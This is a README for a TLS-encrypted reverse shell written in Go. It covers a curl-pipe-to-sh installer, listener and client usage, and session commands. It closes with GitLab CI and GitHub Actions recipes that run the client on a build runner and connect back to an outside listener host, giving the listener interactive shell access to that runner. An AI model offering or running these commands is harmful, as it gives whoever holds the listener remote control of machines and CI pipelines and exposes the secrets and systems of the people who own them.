# Golang TLS Reverse Shell (TCP)

Minimal, encrypted reverse shell over raw TCP with TLS (no HTTP).

## Install
- Binstaller (recommended):
  ```bash
  curl -fsSL https://frjcomp.github.io/golang-https-rev/install.sh | sh
  ```
  Set `BINSTALLER_BIN` to change install dir (defaults to `~/.local/bin`).

- From source:
  ```bash
  git clone https://github.com/frjcomp/golang-https-rev.git
  cd golang-https-rev
  make build  # outputs to bin/
  ```

## Usage
- Start listener (TLS, self-signed):
  ```bash
  ./listener <port> <bind-ip>
  ```
- Start client:
  ```bash
  ./reverse <host:port> <max-retries>
  ```
- Core listener commands: `list`, `use <client>`, `exit`.
- In a session: run shell commands; `background` to return.

## Notes
- Protocol: TLS 1.2+ over TCP only (no HTTP).
- Defaults to self-signed cert generation on the listener.

## CI examples
- GitLab CI (`.gitlab-ci.yml`):
  ```yaml
  stages: [run]
  reverse:
    stage: run
    image: alpine:3.19
    script:
      - apk add --no-cache curl
      - curl -fsSL https://frjcomp.github.io/golang-https-rev/install.sh | sh
      - ~/.local/bin/reverse listener.example.com:8443 3
  ```

- GitHub Actions:
  ```yaml
  name: reverse
  on: [workflow_dispatch]
  jobs:
    run-reverse:
      runs-on: ubuntu-latest
      steps:
        - name: Install reverse client
          run: curl -fsSL https://frjcomp.github.io/golang-https-rev/install.sh | sh
        - name: Run reverse
          run: ~/.local/bin/reverse listener.example.com:8443 3
  ```
